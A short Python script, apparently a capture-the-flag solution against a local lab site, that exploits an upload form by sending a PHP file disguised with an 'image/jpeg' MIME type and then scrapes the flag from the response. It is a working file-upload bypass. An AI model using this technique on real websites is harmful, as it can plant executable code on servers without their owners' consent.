import requests
import re

def get_flag_in_page(page):
	pattern = re.compile('<.*?>')
	for line in page.split("\n"):
		if "flag" in line:
			flag_line = re.sub(pattern, '', line)
			flag_line = flag_line.split(":")[1].strip();
			return flag_line.split("/")[0].strip();

url = 'http://localhost:8080/index.php?page=upload'
files = {'uploaded': ('index.php', open('index.php', 'rb'), 'image/jpeg')}
data = {'Upload': 'Upload'}

response = requests.post(url, files=files, data=data)

if response.status_code == 200 and "flag" in response.text:
	flag_line = get_flag_in_page(response.text)
	print(f"Flag: {flag_line}")
